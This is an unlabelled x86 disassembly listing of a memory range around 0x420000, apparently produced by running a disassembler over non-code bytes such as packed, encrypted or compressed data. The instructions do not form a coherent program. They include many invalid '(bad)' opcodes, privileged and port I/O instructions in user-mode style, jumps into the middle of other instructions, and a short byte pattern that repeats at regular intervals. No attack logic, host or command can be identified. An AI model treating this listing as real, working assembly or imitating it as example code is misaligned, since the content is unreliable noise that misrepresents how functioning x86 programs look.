  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xfffffffc
  4200e3:	ret    0xd39a
  4200e6:	addr16 pop eax
  4200e8:	add    DWORD PTR [eax],eax
  4200ea:	add    BYTE PTR [ecx],al
  4200ec:	add    BYTE PTR [eax],al
  4200ee:	mov    ch,BYTE PTR [ecx-0x32e3b914]
  4200f4:	sbb    BYTE PTR [ecx+edi*4+0x62d740a],bl
  4200fb:	adc    edx,DWORD PTR [eax+eax*1-0x49]
  4200ff:	mov    ah,0x33
  420101:	jne    0x42010c
  420103:	cwde   
  420104:	std    
  420105:	lea    eax,[ebx+0x2fd23de2]
  42010b:	xchg   ebx,eax
  42010c:	inc    eax
  42010d:	mov    ebx,0xb15ff4fc
  420112:	(bad)  
  420113:	xchg   DWORD PTR [ebp+0x1dd79fc7],ebx
  420119:	loope  0x4200b4
  42011b:	cdq    
  42011c:	rol    DWORD PTR [eax],0xfb
  42011f:	or     ebp,DWORD PTR [ecx-0xb]
  420122:	(bad)  
  420123:	lods   al,BYTE PTR ds:[esi]
  420124:	sub    eax,0xa462d5f2
  420129:	sub    eax,0x5c733d10
  42012e:	mov    ecx,0xf862938a
  420133:	imul   esi,DWORD PTR [edi],0x39ac1a41
  420139:	push   eax
  42013a:	clc    
  42013b:	and    edx,ecx
  42013d:	and    BYTE PTR [esi],bh
  42013f:	and    dl,BYTE PTR [edx]
  420141:	mov    edx,0x412b2794
  420146:	lds    eax,FWORD PTR ds:0x56bf97fd
  42014c:	sti    
  42014d:	pop    ss
  42014e:	sub    DWORD PTR [eax+ebp*4],ebx
  420151:	jnp    0x420125
  420153:	ins    DWORD PTR es:[edi],dx
  420154:	shr    DWORD PTR [eax],0xe6
  420157:	inc    ecx
  420158:	jg     0x42013f
  42015a:	loopne 0x420130
  42015c:	pop    edx
  42015d:	jle    0x4201dd
  42015f:	loope  0x420136
  420161:	adc    dh,BYTE PTR [ebx-0x4b580db7]
  420167:	mov    eax,ds:0xd698fddc
  42016c:	ins    BYTE PTR es:[edi],dx
  42016d:	je     0x4201b6
  42016f:	scas   eax,DWORD PTR es:[edi]
  420170:	pop    ebp
  420171:	mov    dl,0x64
  420173:	sbb    edx,DWORD PTR [edx+0x48]
  420176:	jl     0x4201ec
  420178:	sar    BYTE PTR ds:0x3c0b4fcb,0xf2
  42017f:	ret    
  420180:	add    eax,0x8eefe613
  420185:	(bad)  
  420186:	cdq    
  420187:	in     eax,0xf0
  420189:	dec    ecx
  42018a:	push   esp
  42018b:	push   esp
  42018c:	dec    eax
  42018d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42018e:	push   ecx
  42018f:	out    0xda,eax
  420191:	int    0x6a
  420193:	xchg   ecx,eax
  420194:	inc    edi
  420195:	int3   
  420196:	push   0x2ff17d5
  42019b:	dec    ebx
  42019c:	in     eax,0xa1
  42019e:	mov    dh,0x78
  4201a0:	loop   0x4201c3
  4201a2:	sub    ecx,DWORD PTR [ebp+0x2fc7b588]
  4201a8:	fsub   st,st(1)
  4201aa:	xchg   ebp,eax
  4201ab:	mov    edx,0x9ae7da05
  4201b0:	mov    dh,0x97
  4201b2:	rcr    DWORD PTR [edx+0x17a1872a],cl
  4201b8:	mov    ch,0x68
  4201ba:	pop    edi
  4201bb:	loope  0x4201c1
  4201bd:	popa   
  4201be:	shr    DWORD PTR [ebp-0x572ee169],1
  4201c4:	les    ebx,FWORD PTR [esi]
  4201c6:	push   edi
  4201c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201c8:	mov    cl,0xfd
  4201ca:	cmp    ebx,edi
  4201cc:	out    0x2c,al
  4201ce:	loop   0x420229
  4201d0:	fld    DWORD PTR [ecx-0x62edd724]
  4201d6:	mov    dh,0x14
  4201d8:	mov    dl,0xf1
  4201da:	stos   BYTE PTR es:[edi],al
  4201db:	packsswb mm2,QWORD PTR [eax]
  4201de:	push   edi
  4201df:	popa   
  4201e0:	xchg   ebx,edi
  4201e2:	ins    BYTE PTR es:[edi],dx
  4201e3:	mov    edi,DWORD PTR [ecx-0x78]
  4201e6:	fnsave ds:0x30cb57c6
  4201ec:	(bad)  
  4201ed:	pushf  
	...
  420256:	jae    0x420227
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx-0x18cb6f18],1
  420266:	addr16 pop ecx
  420268:	add    DWORD PTR [eax],eax
  42026a:	add    BYTE PTR [ecx],al
  42026c:	add    BYTE PTR [eax],al
  42026e:	pop    esi
  42026f:	jg     0x4201f4
  420271:	mov    ebx,esi
  420273:	mov    dl,0x60
  420276:	imul   ebx,ecx,0x62
  420279:	inc    ebx
  42027a:	dec    edx
  42027b:	inc    ecx
  42027c:	push   ds
  42027d:	outs   dx,BYTE PTR ds:[esi]
  42027e:	aas    
  42027f:	(bad)  
  420280:	leave  
  420281:	lods   eax,DWORD PTR ds:[esi]
  420282:	push   ecx
  420283:	ret    
  420284:	ds xchg esi,eax
  420286:	ss and dh,cl
  420289:	addr16 nop
  42028b:	(bad)  
  42028c:	adc    BYTE PTR [ebx+0x43b81378],al
  420292:	outs   dx,BYTE PTR ds:[esi]
  420293:	stc    
  420294:	lock jg 0x4202f0
  420297:	bound  ebx,QWORD PTR [esi]
  420299:	jns    0x4202c7
  42029b:	in     al,0x74
  42029d:	iret   
  42029e:	test   al,0x10
  4202a0:	fldcw  WORD PTR [edx]
  4202a2:	mov    ds:0xe9a56c7e,eax
  4202a7:	loopne 0x420263
  4202a9:	sahf   
  4202aa:	cmp    eax,0x7be1a936
  4202af:	or     ecx,eax
  4202b1:	arpl   WORD PTR [eax],ax
  4202b3:	mov    ds:0x8c6bb4d6,al
  4202b8:	(bad)  
  4202b9:	jg     0x4202b4
  4202bb:	and    cl,BYTE PTR [ebx]
  4202bd:	mov    al,0x3c
  4202bf:	repz mov edx,0xd7c08f1e
  4202c5:	and    eax,0x68e17a37
  4202ca:	(bad)  
  4202cb:	dec    ecx
  4202cc:	outs   dx,BYTE PTR ds:[esi]
  4202cd:	shl    ebp,0x8a
  4202d0:	jge    0x420252
  4202d2:	rcl    DWORD PTR [esp+esi*2-0x55d6b862],0x3c
  4202da:	push   ebx
  4202db:	mov    al,0xf8
  4202dd:	push   esp
  4202df:	mov    edi,esi
  4202e1:	rol    bl,1
  4202e3:	stos   BYTE PTR es:[edi],al
  4202e4:	retf   
  4202e5:	cmp    BYTE PTR [ecx+0x10cb5716],al
  4202eb:	mov    edx,0xdc3997de
  4202f0:	xor    DWORD PTR ds:0xd9a69cce,esi
  4202f6:	xchg   ebx,eax
  4202f7:	jmp    eax
  4202f9:	dec    edx
  4202fa:	dec    esi
  4202fb:	fs pop ss
  4202fd:	add    BYTE PTR [ecx+0x49519064],ah
  420303:	mov    al,0x1e
  420305:	xor    al,0x54
  420307:	stos   BYTE PTR es:[edi],al
  420308:	cmp    cl,BYTE PTR ds:0x94193e2e
  42030e:	bound  ebx,QWORD PTR [ecx]
  420310:	pop    es
  420311:	fidiv  WORD PTR [ecx+0x4078ee23]
  420317:	leave  
  420318:	push   esp
  420319:	test   ebp,eax
  42031b:	iret   
  42031c:	shl    DWORD PTR [ebp+0x43f0398e],1
  420322:	sti    
  420323:	push   edi
  420324:	and    edi,edx
  420326:	add    ebp,esp
  420328:	mov    al,0x7c
  42032a:	sahf   
  42032b:	and    al,0xda
  42032d:	addr16 pop es
  42032f:	cs hlt 
  420331:	fwait
  420332:	or     eax,0x5f6091a6
  420337:	in     al,0x98
  420339:	into   
  42033a:	sbb    eax,esp
  42033c:	aam    0x85
  42033e:	dec    ebp
  42033f:	xor    cl,BYTE PTR [edi-0x70adb2b6]
  420345:	or     al,0xd5
  420347:	mov    ?,WORD PTR [ebp+ecx*2-0x7b]
  42034b:	addr16 sbb bh,ah
  42034e:	outs   dx,BYTE PTR ds:[esi]
  42034f:	lahf   
  420350:	or     ebx,ebx
  420352:	inc    edi
  420353:	icebp  
  420354:	mov    al,ds:0x85ca0103
  420359:	mov    cs,WORD PTR [edx-0x74]
  42035c:	xchg   esp,eax
  42035d:	push   ss
  42035e:	or     DWORD PTR [eax+0x52fe3e67],ecx
  420364:	sbb    dh,BYTE PTR [eax+edi*4-0x3127bc2b]
  42036b:	popa   
  42036c:	jb     0x42030f
	...
  4203d6:	inc    ecx
  4203d7:	push   es
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	sahf   
  4203e3:	loop   0x420407
  4203e5:	cmp    esp,DWORD PTR [edi+0x5a]
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	add    BYTE PTR [ecx],al
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	lods   eax,DWORD PTR ds:[esi]
  4203ef:	mov    al,ds:0xb64d3e41
  4203f4:	pop    edi
  4203f5:	jle    0x4203c0
  4203f7:	pop    es
  4203f8:	retf   0x421f
  4203fb:	aad    0xa4
  4203fd:	shl    DWORD PTR [ebp+0x3e9f0e6b],cl
  420403:	popf   
  420404:	jns    0x420445
  420406:	jp     0x42046f
  420408:	inc    ebx
  420409:	pusha  
  42040a:	mov    esp,0xce7ea59e
  42040f:	pop    eax
  420410:	adc    esi,DWORD PTR [esp+edx*2]
  420413:	mov    cl,0x6c
  420415:	(bad)  
  420417:	cmp    ch,bl
  420419:	shl    DWORD PTR cs:[eax],1
  42041c:	mov    BYTE PTR [esi+0x26],ah
  42041f:	sub    cl,cl
  420421:	and    al,0xee
  420423:	cmp    eax,0x1b3e4686
  420428:	jns    0x4203e0
  42042a:	aad    0xef
  42042c:	sbb    eax,DWORD PTR [esi]
  42042e:	mov    bl,0x63
  420430:	inc    eax
  420431:	sahf   
  420432:	xor    edx,0x5a
  420435:	or     cl,BYTE PTR [ecx]
  420437:	mov    ebx,0xdb8e85d2
  42043c:	gs scas al,BYTE PTR es:[edi]
  42043e:	jge    0x42049b
  420440:	sar    BYTE PTR [ebx],cl
  420442:	ss std 
  420444:	xor    DWORD PTR [ebx-0x12],edx
  420447:	mov    al,ds:0x667b4251
  42044c:	inc    edx
  42044d:	pop    ss
  42044e:	das    
  42044f:	push   0x72
  420451:	inc    esp
  420452:	popf   
  420453:	or     BYTE PTR [ebx+0x36],0xaf
  420457:	ss mov ecx,0xb5d56239
  42045d:	jne    0x42049a
  42045f:	stos   DWORD PTR es:[edi],eax
  420460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420461:	lock add bh,al
  420464:	cmp    ecx,DWORD PTR [eax+0x5cc30ac9]
  42046a:	or     eax,0x6bc4fd21
  42046f:	rcl    edx,cl
  420471:	clc    
  420472:	cmp    esi,ecx
  420474:	cmp    DWORD PTR [eax+eax*1-0x259c87c0],ecx
  42047b:	push   esp
  42047c:	inc    edi
  42047d:	dec    edi
  42047e:	mov    al,0x3f
  420480:	mov    ebx,0x80a63875
  420485:	or     al,0x10
  420487:	jecxz  0x420482
  420489:	mov    esi,0xe177e2d2
  42048e:	xor    BYTE PTR [ecx+0x700aeda2],bl
  420494:	std    
  420495:	cmp    eax,0xf474d639
  42049a:	loop   0x42041c
  42049c:	scas   al,BYTE PTR es:[edi]
  42049d:	aas    
  42049e:	scas   al,BYTE PTR es:[edi]
  42049f:	aam    0xa7
  4204a1:	sbb    bl,BYTE PTR [edi]
  4204a3:	pop    ecx
  4204a4:	lock es (bad) 
  4204a7:	not    DWORD PTR [edi+esi*2]
  4204aa:	outs   dx,DWORD PTR ds:[esi]
  4204ab:	mov    esp,0xb370bf9a
  4204b0:	rcl    DWORD PTR [edi],1
  4204b2:	push   0xb50d840d
  4204b7:	gs jmp 0x4204e3
  4204ba:	fistp  DWORD PTR [ebx+0x6874f1e8]
  4204c0:	fsubr  QWORD PTR [esi-0x77ff5396]
  4204c6:	mov    esp,0x1923526e
  4204cb:	or     al,0xb2
  4204cd:	mov    bh,0x64
  4204cf:	loopne 0x4204ba
  4204d1:	rol    DWORD PTR [edi],1
  4204d3:	jns    0x420514
  4204d5:	cmp    DWORD PTR [edi-0x73],edx
  4204d8:	add    DWORD PTR [eax+edx*2+0x38b4243e],eax
  4204df:	test   eax,0xb53c6469
  4204e4:	xchg   edi,eax
  4204e5:	add    BYTE PTR [edi-0x4f131619],ch
  4204eb:	shr    bh,cl
  4204ed:	xchg   esi,eax
	...
  420556:	scas   al,BYTE PTR es:[edi]
  420557:	xchg   esp,eax
  420558:	push   edi
  420559:	adc    bh,BYTE PTR [edi-0x2d]
  42055c:	out    dx,eax
  42055d:	mov    esp,0x5a7f6c39
  420562:	xchg   al,bh
  420564:	cmc    
  420565:	jb     0x4205ce
  420567:	pop    ebx
  420568:	add    DWORD PTR [eax],eax
  42056a:	add    BYTE PTR [ecx],al
  42056c:	add    BYTE PTR [eax],al
  42056e:	mov    dl,0x14
  420570:	mov    al,0x2b
  420572:	cmp    al,BYTE PTR ds:0x77fce98c
  420578:	mov    al,0xeb
  42057a:	push   ebp
  42057b:	jno    0x4205b9
  42057d:	arpl   WORD PTR [ecx+0x7f9c1dbb],si
  420583:	push   esi
  420584:	call   0x5ba5:0x4bc91b30
  42058b:	add    eax,DWORD PTR [edx]
  42058d:	out    dx,eax
  42058e:	mov    bh,0xde
  420590:	xor    DWORD PTR [edx],edi
  420592:	js     0x4205fa
  420594:	jae    0x4205bf
  420596:	in     eax,dx
  420597:	adc    al,0xb2
  420599:	(bad)
  42059c:	aad    0x3f
  42059e:	loop   0x420608
  4205a0:	(bad)  [ebx-0x459d52d4]
  4205a6:	ret    0x42c7
  4205a9:	rcr    DWORD PTR ds:0xbac7706e,0xa
  4205b0:	je     0x4205ba
  4205b2:	cmp    dh,BYTE PTR [edi]
  4205b4:	in     eax,0x11
  4205b6:	arpl   WORD PTR [ecx],bx
  4205b8:	call   DWORD PTR [ebp-0x6cff58d8]
  4205be:	cwde   
  4205bf:	jbe    0x4205de
  4205c1:	sub    BYTE PTR ds:0xbac35121,cl
  4205c7:	repz div ch
  4205ca:	push   esi
  4205cb:	pusha  
  4205cc:	into   
  4205cd:	dec    ecx
  4205ce:	jne    0x4205f0
  4205d0:	test   eax,0xd2fe4cb6
  4205d5:	jle    0x4205f3
  4205d7:	mov    eax,0x374f9e5c
  4205dc:	dec    esp
  4205dd:	pop    ebx
  4205de:	cdq    
  4205df:	enter  0xd569,0xeb
  4205e3:	push   esp
  4205e4:	popa   
  4205e5:	cmp    ebx,DWORD PTR [ebx-0x49]
  4205e8:	pop    es
  4205e9:	call   0xeadf80cb
  4205ee:	jecxz  0x4205ca
  4205f0:	scas   eax,DWORD PTR es:[edi]
  4205f1:	outs   dx,BYTE PTR ds:[esi]
  4205f2:	out    dx,eax
  4205f3:	pop    edi
  4205f4:	lods   eax,DWORD PTR ds:[esi]
  4205f5:	in     eax,dx
  4205f6:	stc    
  4205f7:	pop    ds
  4205f8:	loope  0x420669
  4205fa:	mov    esi,DWORD PTR [edi]
  4205fc:	jo     0x4205aa
  4205fe:	push   esp
  4205ff:	ds mov eax,0xbac78d49
  420605:	mov    bh,0x8a
  420607:	lds    ebx,FWORD PTR [esi-0x7cac8406]
  42060d:	xor    BYTE PTR [edx-0xb],dh
  420610:	dec    ebx
  420611:	ins    DWORD PTR es:[edi],dx
  420612:	cs aaa 
  420614:	loope  0x4205e8
  420616:	push   ebx
  420617:	cmp    cl,BYTE PTR [ecx-0xdf04eae]
  42061d:	inc    ebp
  42061e:	imul   esp,esi,0xffffffb8
  420621:	(bad)  
  420622:	loop   0x42065c
  420624:	lods   eax,DWORD PTR ds:[esi]
  420625:	dec    esp
  420626:	mov    eax,ds:0xd9fc20b7
  42062b:	jge    0x420638
  42062d:	outs   dx,DWORD PTR ds:[esi]
  42062e:	xor    DWORD PTR [ebp+0x48d81ab3],0x2989b687
  420638:	or     ebx,DWORD PTR [edx-0x7771a81b]
  42063e:	shl    BYTE PTR [ebx+0x16f11d9f],cl
  420644:	inc    esi
  420645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420646:	je     0x420686
  420648:	ja     0x42067c
  42064a:	fwait
  42064b:	xchg   BYTE PTR [esi-0xe435c85],dl
  420651:	and    esp,DWORD PTR [ebx-0x5ea4091b]
  420657:	dec    esp
  420658:	mov    al,ds:0xfde7d48d
  42065d:	jp     0x420692
  42065f:	jmp    0xc777:0x3412b409
  420666:	out    dx,al
  420667:	adc    ecx,DWORD PTR [ebp+edx*2+0x0]
  42066b:	add    DWORD PTR [ecx+0x7b],edx
	...
  4206d6:	test   BYTE PTR [eax-0x48],ch
  4206d9:	or     ah,bh
  4206db:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  4206e2:	mov    ds:0x678b585c,al
  4206e7:	pop    esp
  4206e8:	add    DWORD PTR [eax],eax
  4206ea:	add    BYTE PTR [ecx],al
  4206ec:	add    BYTE PTR [eax],al
  4206ee:	mov    DWORD PTR [eax+0x10904fd2],esi
  4206f4:	jle    0x4206c7
  4206f6:	xchg   edx,eax
  4206f7:	jne    0x420692
  4206f9:	pusha  
  4206fa:	push   0xffffffa6
  4206fc:	ss adc eax,0x3d4f9743
  420702:	lea    edi,[ebp-0x52]
  420705:	xor    DWORD PTR ds:0xe5743f9d,ebp
  42070b:	jecxz  0x4206a5
  42070d:	cmp    DWORD PTR [ebp-0x16],eax
  420710:	jnp    0x420786
  420712:	cmp    ah,BYTE PTR [ebx]
  420714:	imul   DWORD PTR ds:0xe8fa6b11
  42071a:	fisubr DWORD PTR [edx]
  42071c:	imul   eax,DWORD PTR [eax],0xffffffc9
  42071f:	mov    dl,0xa4
  420721:	stc    
  420722:	push   esp
  420723:	and    BYTE PTR [edx-0x29],dh
  420726:	ins    BYTE PTR es:[edi],dx
  420727:	push   edx
  420728:	mov    edx,0x95aa075d
  42072d:	pop    esi
  42072e:	mov    ds:0x921751ce,eax
  420733:	ret    
  420734:	fiadd  DWORD PTR ds:0x9a71c22e
  42073a:	cmp    edx,DWORD PTR [edi-0x57351b00]
  420740:	adc    DWORD PTR ds:0x844c17bc,ecx
  420746:	sub    edx,DWORD PTR [eax+ecx*4-0x10f6400c]
  42074d:	mov    DWORD PTR [edi],edi
  42074f:	or     dh,BYTE PTR [ebx+0x235890c0]
  420755:	jmp    FWORD PTR [esi]
  420757:	push   esi
  420758:	jmp    0x16b0a037
  42075d:	jge    0x4207cd
  42075f:	add    cl,ch
  420761:	fistp  QWORD PTR [edx+0x3f405a86]
  420767:	sar    BYTE PTR [edi],cl
  420769:	cli    
  42076a:	or     dl,BYTE PTR [ebx+0xa]
  42076d:	xor    ch,ch
  42076f:	scas   al,BYTE PTR es:[edi]
  420770:	mov    ah,0xa1
  420772:	dec    ebx
  420773:	mov    dh,0x78
  420775:	mov    bl,0x5d
  420777:	sti    
  420778:	test   DWORD PTR [esi],ebp
  42077a:	imul   eax,DWORD PTR [edx+ebp*1+0x40],0xd9086114
  420782:	fwait
  420783:	pop    esp
  420784:	push   ss
  420785:	xchg   ebx,eax
  420786:	sahf   
  420787:	ret    
  420788:	fsub   QWORD PTR [esi-0x26b151c8]
  42078e:	aam    0x63
  420790:	mov    ebp,0x252ca8c1
  420795:	dec    ebx
  420796:	mov    esp,DWORD PTR [ecx]
  420798:	stos   DWORD PTR es:[edi],eax
  420799:	sbb    al,0x8c
  42079b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42079c:	jae    0x420817
  42079e:	test   al,0xbf
  4207a0:	adc    edi,DWORD PTR [esi-0x2bc987e5]
  4207a6:	scas   eax,DWORD PTR es:[edi]
  4207a7:	mov    ch,0x8b
  4207a9:	outs   dx,BYTE PTR ds:[esi]
  4207aa:	je     0x420741
  4207ac:	push   eax
  4207ad:	imul   eax,DWORD PTR [eax+0x6b],0x4828c1ca
  4207b4:	dec    edi
  4207b5:	in     eax,0xb7
  4207b7:	enter  0x2b59,0x1b
  4207bb:	xchg   ebp,eax
  4207bc:	inc    esp
  4207bd:	dec    ebx
  4207be:	stos   BYTE PTR es:[edi],al
  4207bf:	add    BYTE PTR [ebx-0x729ec5c2],ah
  4207c5:	pop    esi
  4207c6:	fwait
  4207c7:	xchg   DWORD PTR [ecx-0x76],ebx
  4207ca:	shl    BYTE PTR [edx-0x4aa2f3bb],0x8d
  4207d1:	fidivr WORD PTR [ebx]
  4207d3:	fstp   st(2)
  4207d5:	mov    ebp,0x15d4e9d1
  4207da:	sub    eax,0x14dcf070
  4207df:	mov    ds:0xc8cb8266,eax
  4207e4:	or     DWORD PTR [edx+0x23],ecx
  4207e7:	je     0x420821
  4207e9:	mov    edx,ebx
  4207eb:	or     edx,ebp
  4207ed:	lahf   
	...
  420856:	mov    DWORD PTR [edi],ebp
  420858:	and    eax,0xad8aa780
  42085d:	das    
  42085e:	cmp    DWORD PTR [edi-0x24],ebp
  420861:	pusha  
  420862:	arpl   WORD PTR [ebp+ebp*4+0x5f],ax
  420866:	addr16 pop ebp
  420868:	add    DWORD PTR [eax],eax
  42086a:	add    BYTE PTR [ecx],al
  42086c:	add    BYTE PTR [eax],al
  42086e:	cmp    ecx,DWORD PTR [ebx]
  420870:	and    edx,edi
  420872:	or     BYTE PTR [ecx+0x605ed5d7],0x1e
  420879:	jmp    0x42084b
  42087b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42087c:	rsm    
  42087e:	xor    esi,DWORD PTR [edx-0x2748397b]
  420884:	pop    esp
  420885:	out    0xd5,al
  420887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420888:	aad    0x0
  42088a:	popa   
  42088b:	sti    
  42088c:	lea    edx,[esi]
  42088e:	in     eax,dx
  42088f:	lock jno 0x4208c5
  420892:	push   ebx
  420893:	into   
  420894:	das    
  420895:	xlat   BYTE PTR ds:[ebx]
  420896:	les    eax,FWORD PTR [edi]
  420898:	xchg   ecx,eax
  420899:	jmp    0x42081d
  42089b:	popf   
  42089c:	mov    ecx,0xd9bad5da
  4208a1:	int3   
  4208a2:	ds call 0xd7b5:0xd60d6b87
  4208aa:	test   BYTE PTR [eax-0x4e2f8a15],0x1f
  4208b1:	aam    0xd9
  4208b3:	jp     0x42085c
  4208b5:	hlt    
  4208b6:	sub    BYTE PTR [ecx],ah
  4208b8:	xchg   ecx,eax
  4208b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208ba:	mov    ebp,0x3ae10311
  4208bf:	ja     0x42092d
  4208c1:	dec    edx
  4208c2:	inc    edi
  4208c3:	pop    esi
  4208c4:	shr    DWORD PTR [edi],cl
  4208c6:	retf   0x22da
  4208c9:	mov    ch,0x5b
  4208cb:	pop    esp
  4208cc:	push   bp
  4208ce:	hlt    
  4208cf:	cli    
  4208d0:	dec    ebp
  4208d1:	lods   eax,DWORD PTR fs:[esi]
  4208d3:	loope  0x42093f
  4208d5:	sahf   
  4208d6:	cmp    eax,0x5f312b58
  4208db:	push   cs
  4208dc:	mov    esp,0xb9948078
  4208e1:	data16 into 
  4208e3:	das    
  4208e4:	repz lock mov ds:0xdf4178d4,al
  4208eb:	sbb    eax,0xd62709cf
  4208f0:	rol    BYTE PTR [edi+0x7d6dcbeb],1
  4208f6:	aas    
  4208f7:	shl    BYTE PTR [esi],0xde
  4208fa:	mov    cl,0xfe
  4208fc:	push   ecx
  4208fd:	mov    eax,0x9e415b9
  420902:	in     eax,dx
  420903:	(bad)  
  420904:	mov    eax,0xfb1b043
  420909:	pusha  
  42090a:	or     BYTE PTR [esi],ch
  42090c:	stc    
  42090d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42090e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42090f:	jle    0x4208cc
  420911:	pop    eax
  420912:	pusha  
  420913:	aas    
  420914:	jg     0x420904
  420916:	mov    bl,0xa4
  420918:	les    edx,FWORD PTR [edi]
  42091a:	stos   DWORD PTR es:[edi],eax
  42091b:	inc    ebx
  42091c:	xor    BYTE PTR [edi],bl
  42091e:	add    DWORD PTR [esi+0x62fb687b],0xcfefb8f
  420928:	mov    ecx,0xc58f152e
  42092d:	ret    
  42092e:	and    BYTE PTR [esi],0x42
  420931:	add    DWORD PTR [esp+eiz*8+0x3d],edx
  420935:	push   ds
  420936:	enter  0xda2c,0x88
  42093a:	jb     0x4209af
  42093c:	or     ebp,DWORD PTR [ecx+0x36710457]
  420942:	pop    ss
  420943:	jo     0x4209bb
  420945:	scas   eax,DWORD PTR es:[edi]
  420946:	pop    ebx
  420947:	ins    BYTE PTR es:[edi],dx
  420948:	outs   dx,DWORD PTR ds:[esi]
  420949:	pop    eax
  42094a:	sub    DWORD PTR [ecx-0x626bceb7],0x18
  420951:	jmp    0x2e02b4a9
  420956:	jno    0x4209c4
  420958:	sti    
  420959:	gs pop es
  42095b:	sbb    DWORD PTR [ecx*4+0x4b32d7a],0xb2edeec0
  420966:	cmp    ebx,DWORD PTR [edx-0x510a0b97]
  42096c:	ins    BYTE PTR es:[edi],dx
  42096d:	pop    ss
	...
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0xfd
  4209e3:	aad    0xf8
  4209e5:	mov    ds:0x15e67,al
  4209ea:	add    BYTE PTR [ecx],al
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	and    DWORD PTR [ebp-0xe],edi
  4209f1:	retf   
  4209f2:	mov    BYTE PTR [ebp+0x46d1c0b7],ch
  4209f8:	out    0xde,al
  4209fa:	push   esp
  4209fb:	(bad)  
  4209fc:	(bad)  
  4209fe:	cmp    eax,0x312164b7
  420a03:	jl     0x420a35
  420a05:	add    DWORD PTR [esi-0x62a89c58],0x32
  420a0c:	repz sti 
  420a0e:	loop   0x4209ea
  420a10:	add    ecx,esi
  420a12:	sbb    DWORD PTR [eax+0xe20921b],edx
  420a18:	fsubr  DWORD PTR [ecx+0x122b63f2]
  420a1e:	(bad)  
  420a1f:	jno    0x4209b4
  420a21:	fld    TBYTE PTR [esi-0x61]
  420a24:	ret    
  420a25:	cmp    eax,0xa83bd10c
  420a2a:	leave  
  420a2b:	stc    
  420a2c:	mov    dl,0x31
  420a2e:	leave  
  420a2f:	sahf   
  420a30:	cmp    eax,DWORD PTR es:[edx-0x19a3baab]
  420a37:	xchg   ebx,eax
  420a38:	cmp    edx,ebx
  420a3a:	pushf  
  420a3b:	adc    al,BYTE PTR [eax+0x19588d19]
  420a41:	cwde   
  420a42:	adc    eax,0x3f3b6850
  420a47:	dec    edi
  420a48:	inc    edi
  420a49:	repnz retf 0xe1d2
  420a4d:	popf   
  420a4e:	mov    bl,BYTE PTR [ecx+ebx*4+0x43aa47b9]
  420a55:	sub    BYTE PTR [esi+0x65a4432a],0xde
  420a5c:	fwait
  420a5d:	push   ecx
  420a5e:	jg     0x420adf
  420a60:	and    al,0x87
  420a62:	sub    ebp,esp
  420a64:	aaa    
  420a65:	add    eax,0xfef33660
  420a6a:	mov    dl,0xf7
  420a6c:	arpl   WORD PTR [edx+0x2a1fcb9e],si
  420a72:	sub    BYTE PTR [edi+0x10c4f9f3],0xcf
  420a79:	jge    0x420a34
  420a7b:	xor    eax,0xf77bd9ea
  420a80:	arpl   WORD PTR [edx-0x22acd5d8],ax
  420a86:	or     DWORD PTR [edi],ecx
  420a88:	es adc al,0xc
  420a8b:	mov    edx,0x8efc143d
  420a90:	adc    BYTE PTR [ebx+0x7c36db12],bh
  420a96:	mov    al,ds:0x55da5c21
  420a9b:	cmc    
  420a9c:	push   0xf201ab2d
  420aa1:	shl    BYTE PTR [eax-0x282457be],0x5d
  420aa8:	test   BYTE PTR [eax],ch
  420aaa:	jnp    0x420a7d
  420aac:	test   DWORD PTR [ebp-0x3a7dc027],0x8f011623
  420ab6:	fisub  WORD PTR [edx]
  420ab8:	daa    
  420ab9:	mov    BYTE PTR [esi],dh
  420abb:	adc    BYTE PTR [edx],cl
  420abd:	sbb    al,0x30
  420abf:	shl    BYTE PTR [ecx-0x36],0x6c
  420ac3:	sbb    cl,BYTE PTR [ecx+0x889af5b]
  420ac9:	dec    ebx
  420aca:	das    
  420acb:	(bad)  
  420acc:	push   ebp
  420acd:	ja     0x420a50
  420acf:	(bad)  
  420ad0:	arpl   WORD PTR ds:0x79aebdd5,sp
  420ad6:	test   BYTE PTR [edi],ch
  420ad8:	(bad)  
  420ad9:	mov    ecx,0x5345a44c
  420ade:	mov    ch,0x8e
  420ae0:	pop    esi
  420ae1:	add    al,0xbe
  420ae3:	imul   ebp,DWORD PTR [eax],0x13
  420ae6:	aad    0x73
  420ae8:	test   eax,0xb1d12067
  420aed:	cmp    eax,DWORD PTR [eax]
	...
  420b53:	add    BYTE PTR [eax],al
  420b55:	add    bh,bl
  420b57:	xor    ch,BYTE PTR [edi-0x6010ed]
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	dec    ebp
  420b63:	stc    
  420b64:	push   ss
  420b65:	addr16 addr16 pop edi
  420b68:	add    DWORD PTR [eax],eax
  420b6a:	add    BYTE PTR [ecx],al
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	jns    0x420b3e
  420b70:	push   ebx
  420b71:	xor    BYTE PTR [edi+0x546f3196],0x58
  420b78:	sbb    al,0xf7
  420b7a:	xchg   al,cl
  420b7c:	enter  0xa092,0x66
  420b80:	inc    eax
  420b81:	cmp    ecx,DWORD PTR [ebp+0x2a425d1f]
  420b87:	in     al,0x9d
  420b89:	bound  ebx,QWORD PTR [ebx-0x43604bca]
  420b8f:	lods   eax,DWORD PTR ds:[esi]
